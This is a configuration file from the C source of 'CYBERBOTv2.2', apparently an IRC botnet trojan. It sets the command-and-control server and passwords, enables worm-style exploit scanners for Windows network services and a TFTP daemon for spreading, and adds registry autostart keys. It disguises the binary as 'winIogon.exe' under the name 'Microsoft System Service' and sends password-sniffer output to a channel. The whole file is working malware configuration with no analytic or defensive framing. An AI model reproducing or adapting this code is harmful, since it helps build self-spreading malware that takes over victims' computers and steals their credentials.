// CYBERBOTv2.2-Stable.m0dd[ownz.DreamWoRK]

int port = 8887;				// server port
int port2 = 6667;				// backup server port
int tftpport = 6900;				// Port # for tftp daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 7;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = FALSE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\WINDOWS\\SYSTEM32\\cyberlink.ocx";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

// this is the best scan combo
SCANALL scanall[]={
{"netapi139", true},
{"netapi445", true},
{"asn1smb", true},
{NULL, false}
};
char lsaip[] = "";                    // blank
char lsaport[] = "3677";			// cftp port ".lsaport 6969"
char lsuser[] = "cyber";
char lspass[] = "terror";
char botid[] = "cyber";						// bot id
char version[] = "CYBERBOTv2.2-Stable.m0dd[ownz.DreamWoRK]";		// Bots !version reply
char password[] = "cyber-terror";					// bot password
char server[] = "irc.cyber-terror.com";		// server
char serverpass[] = "";						// server password
char channel[] = "#Stable";				// channel that the bot should join
char chanpass[] = "cyber-terror";						// channel password
char server2[] = "";						// backup server (optional)
char channel2[] = "";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = "winIogon.exe";			// destination file name
char valuename[] = "Microsoft System Service";		// value name for autostart
char nickconst[] = "WoRK";					// first part to the bot's nick
char szLocalPayloadFile[]="encrtpy.xml";	// Payload filename
char modeonconn[] = "+xi";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#Stable";					// Channel where exploit messages get redirected
char psniffchan[] = "#Stable-Sniff";						// Channel where psniff messages get redirected

char *authost[] = {
	"*@*"
};

char *versionlist[] = {
"eggdrop v1.6.20",
"eggdrop v1.6.17",
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2pckiws19f3bw3e0"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
